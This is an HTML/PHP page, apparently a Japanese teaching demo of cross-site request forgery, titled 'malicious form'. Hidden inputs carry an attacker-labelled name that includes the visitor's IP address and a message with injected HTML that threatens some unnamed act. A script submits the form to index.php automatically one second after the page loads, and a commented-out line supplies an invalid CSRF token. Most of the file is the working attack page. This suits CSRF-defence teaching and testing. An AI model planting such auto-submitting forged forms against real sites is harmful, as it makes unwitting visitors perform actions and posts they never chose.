<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body{

            font-family: Arial, sans-serif;
            display:grid;
            place-items:center;
            place-content:center;
        }
    </style>
</head>

<body style="">
    <h2>悪意のあるフォーム😈</h2>
    <form action="index.php" method="post" id="form">
        <input type="hidden" name="name" value="私は攻撃者です(IP:<?= $_SERVER['REMOTE_ADDR'] ?>)">
        <input type="hidden" name="message" value="<br>明日xxをxxする😈(悪意のある書き込み)">
        <!-- <input type="hidden" name="csrf_token" value="不正なトークン"> -->
    </form>
    <script>
        //勝手にフォームを自動送信
        setTimeout(() => {
            document.querySelector(`#form`).submit();
        }, 1000);
    </script>

</body>

</html>